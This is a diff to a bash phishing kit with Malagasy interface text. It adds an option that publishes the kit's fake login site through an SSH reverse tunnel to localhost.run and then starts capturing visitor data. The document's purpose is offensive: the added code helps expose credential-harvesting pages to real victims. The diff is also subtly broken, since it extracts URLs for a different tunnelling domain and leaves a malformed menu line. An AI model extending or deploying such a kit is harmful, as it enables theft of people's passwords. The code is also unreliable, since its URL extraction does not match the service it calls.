@@ -269,6 +269,20 @@ capture_data() {
         sleep 0.75
     done
 }
+start_ssh_tunnel() {
+    cusport
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel SSH (Localhost.run)..."
+    setup_site
+    # Lancement du tunnel SSH en arrière-plan et récupération du lien
+    ssh -R 80:127.0.0.1:$PORT localhost.run > .server/ssh.log 2>&1 &
+    sleep 5
+    
+    # Extraction propre de l'URL générée
+    clear; banner_small
+    echo -e "${RED}[${WHITE}-${RED}]${GREEN} Rohy azo (URL) :"
+    grep -o "https://[-0-9a-z]*\.loca.lt" .server/ssh.log
+    capture_data
+}
 
 start_ngrok() {
     cusport
@@ -318,12 +332,14 @@ start_cloudflared() {
 
 
 
+
 tunnel_menu() {
     clear; banner_small
     cat << EOF
 ${RED}[${WHITE}01${RED}]${RED} Localhost    ${RED}[${CYAN}An-toerana${RED}]
 ${RED}[${WHITE}02${RED}]${RED} Ngrok.io     ${RED}[${CYAN}Mila kaonty${RED}]
 ${RED}[${WHITE}03${RED}]${RED} Cloudflared  ${RED}[${CYAN}Mandeha ho azy${RED}]
+${RED}[${WHITE}04${RED}]${RED} Ssh ${RED}[${CYAN}SSh
 EOF
 
     read -p "${RED}[${WHITE}-${RED}]${GREEN} tsantaphis > ${BLUE}"
@@ -331,6 +347,7 @@ EOF
         01) setup_site; capture_data ;;
         02) start_ngrok ;;
         03) start_cloudflared ;;
+        04) start_ssh_tunnel ;;
         
         *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; tunnel_menu ;;
     esac
